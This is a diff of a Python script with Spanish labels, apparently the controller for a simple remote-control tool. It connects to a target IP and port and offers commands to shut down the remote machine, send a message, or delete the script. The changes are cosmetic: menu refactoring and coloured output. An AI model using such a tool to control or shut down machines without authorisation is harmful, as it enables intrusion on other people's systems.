@@ -24,16 +24,20 @@ if platform.system() == 'Linux':
 elif platform.system() == 'Windows':
     borrar = 'cls'
 
-def shell(socket):
-
+def menu():
     print('''
 comandos basicos:
-[1] apagar equipo
-[2] enviar mensaje
-[q] salir
-[borrar] borrar script
+          
+[\033[0;32m1\033[0m] apagar equipo
+[\033[0;32m2\033[0m] enviar mensaje
+[\033[0;32mq\033[0m] salir
+[\033[0;32mborrar\033[0m] borrar script
           ''')
-   
+
+
+def shell(socket):
+
+    menu()
     entrada = str(input('[#] comando >> '))
     if entrada == 'q':
         print('\n\033[0;32m[*] saliendo\033[0m\n')
@@ -76,7 +80,7 @@ def conexion(contador):
                     print(f'\n\033[0;32m[*] conectado a {arg.ip}:{arg.puerto}\033[0m\n')
                 salida = shell(socket=s)
             else:
-                print('\n\033[0;32mconexion perdida\033[0m\n')
+                print('\n\033[0;31mconexion perdida\033[0m\n')
                 raise TimeoutError
         except (TimeoutError,ConnectionResetError):
             
